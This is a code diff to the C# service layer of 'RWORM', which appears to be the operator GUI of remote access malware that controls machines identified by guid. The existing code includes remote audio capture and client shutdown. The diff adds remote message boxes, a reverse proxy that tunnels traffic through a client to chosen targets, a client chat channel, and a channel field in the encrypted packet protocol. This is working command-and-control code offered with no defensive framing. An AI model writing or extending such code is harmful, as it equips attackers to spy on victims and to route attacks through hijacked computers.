@@ -67,6 +67,7 @@ namespace RWORM.GUI.Services
         // Key = guid, Value = dict of packetType -> handler
 
         private readonly Dictionary<string, Dictionary<byte, Action<byte[]>>> _handlers = new();
+        private readonly Dictionary<string, Dictionary<byte, Action<byte[], int>>> _channelHandlers = new();
 
         private readonly object _handlersLock = new();
 
@@ -433,6 +434,30 @@ namespace RWORM.GUI.Services
         public Task StartAudio(string guid) => GuiSend(0xE5, guid, Array.Empty<byte>());
         public Task StopAudio(string guid) => GuiSend(0xE7, guid, Array.Empty<byte>());
 
+        // ── MessageBox 0xD8-0xD9 ─────────────────────────────────────────────
+        public Task ShowRemoteMessageBox(string guid, string title, string message, uint buttons = 0, uint icon = 0, Action<byte[]>? cb = null)
+        {
+            if (cb != null) RegisterHandler(guid, 0xD9, cb);
+            string escTitle = title.Replace("\\", "\\\\").Replace("\"", "\\\"");
+            string escMsg = message.Replace("\\", "\\\\").Replace("\"", "\\\"");
+            string json = "{\"title\":\"" + escTitle + "\",\"message\":\"" + escMsg + "\",\"buttons\":" + buttons + ",\"icon\":" + icon + "}";
+            return GuiSend(0xD8, guid, Encoding.UTF8.GetBytes(json));
+        }
+
+        // ── Reverse Proxy 0x90-0x92 ──────────────────────────────────────────
+        public void RegisterProxyDataHandler(string guid, Action<byte[], int> cb) => RegisterChannelHandler(guid, 0x91, cb);
+        public void UnregisterProxyDataHandler(string guid) => UnregisterChannelHandler(guid, 0x91);
+
+        public Task ProxyStart(string guid, int channel, string target) => GuiSend(0x90, guid, Encoding.UTF8.GetBytes(target), channel);
+        public Task ProxySend(string guid, int channel, byte[] data) => GuiSend(0x91, guid, data, channel);
+        public Task ProxyStop(string guid, int channel) => GuiSend(0x92, guid, Array.Empty<byte>(), channel);
+
+        // ── Client Chat 0xEA-0xEC ─────────────────────────────────────────────
+        public void RegisterChatRecvHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xEB, cb);
+        public void UnregisterChatRecvHandler(string guid) => UnregisterHandler(guid, 0xEB);
+        public Task SendChatMessage(string guid, string message) => GuiSend(0xEA, guid, Encoding.UTF8.GetBytes(message));
+        public Task CloseClientChat(string guid) => GuiSend(0xEC, guid, Array.Empty<byte>());
+
         // ── Client control ────────────────────────────────────────────────────
 
         public Task ClientClose(string guid)     => GuiSend(0xA0, guid, Array.Empty<byte>());
@@ -501,7 +526,7 @@ namespace RWORM.GUI.Services
 
         // ── Internal routing helpers ──────────────────────────────────────────
 
-        private Task GuiSend(byte type, string guid, byte[] rest)
+        private Task GuiSend(byte type, string guid, byte[] rest, int channel = 0)
 
         {
 
@@ -515,7 +540,7 @@ namespace RWORM.GUI.Services
 
             Array.Copy(rest, 0, payload, guidBytes.Length, rest.Length);
 
-            return RawSendAsync(Build(type, payload));
+            return RawSendAsync(Build(type, payload, channel));
 
         }
 
@@ -553,6 +578,24 @@ namespace RWORM.GUI.Services
 
             }
 
+        }
+
+        private void RegisterChannelHandler(string guid, byte type, Action<byte[], int> cb)
+        {
+            lock (_handlersLock)
+            {
+                if (!_channelHandlers.TryGetValue(guid, out var d))
+                    _channelHandlers[guid] = d = new Dictionary<byte, Action<byte[], int>>();
+                d[type] = cb;
+            }
+        }
+
+        private void UnregisterChannelHandler(string guid, byte type)
+        {
+            lock (_handlersLock)
+            {
+                if (_channelHandlers.TryGetValue(guid, out var d)) d.Remove(type);
+            }
         }
 
 
@@ -614,6 +657,7 @@ namespace RWORM.GUI.Services
                 int pLen = BitConverter.ToInt32(raw, 0);
 
                 byte pType = raw[4];
+                int pChan = BitConverter.ToInt32(raw, 5);
 
                 if (pLen < 0 || pLen > 100 * 1024 * 1024) { lock (_buf) _buf.Clear(); return; }
 
@@ -657,7 +701,7 @@ namespace RWORM.GUI.Services
 
                 lock (_buf) _buf.RemoveRange(0, total);
 
-                DispatchIncoming(pType, plainPayload);
+                DispatchIncoming(pType, pChan, plainPayload);
 
             }
 
@@ -665,7 +709,7 @@ namespace RWORM.GUI.Services
 
 
 
-        private void DispatchIncoming(byte type, byte[] payload)
+        private void DispatchIncoming(byte type, int channel, byte[] payload)
 
         {
 
@@ -727,7 +771,14 @@ namespace RWORM.GUI.Services
 
 
 
-            if (handlers != null && handlers.TryGetValue(type, out var handler))
+            Dictionary<byte, Action<byte[], int>>? chanHandlers = null;
+            lock (_handlersLock) _channelHandlers.TryGetValue(guid, out chanHandlers);
+
+            if (chanHandlers != null && chanHandlers.TryGetValue(type, out var chanHandler))
+            {
+                try { chanHandler(rest, channel); } catch { }
+            }
+            else if (handlers != null && handlers.TryGetValue(type, out var handler))
 
             {
 
@@ -797,7 +848,7 @@ namespace RWORM.GUI.Services
 
         private static byte[] Build(byte type, string text) => Build(type, Encoding.UTF8.GetBytes(text));
 
-        private static byte[] Build(byte type, byte[] pl)
+        private static byte[] Build(byte type, byte[] pl, int channel = 0)
 
         {
 
@@ -808,6 +859,7 @@ namespace RWORM.GUI.Services
             BitConverter.GetBytes(encrypted.Length).CopyTo(hdr, 0);
 
             hdr[4] = type;
+            BitConverter.GetBytes(channel).CopyTo(hdr, 5);
 
 
 
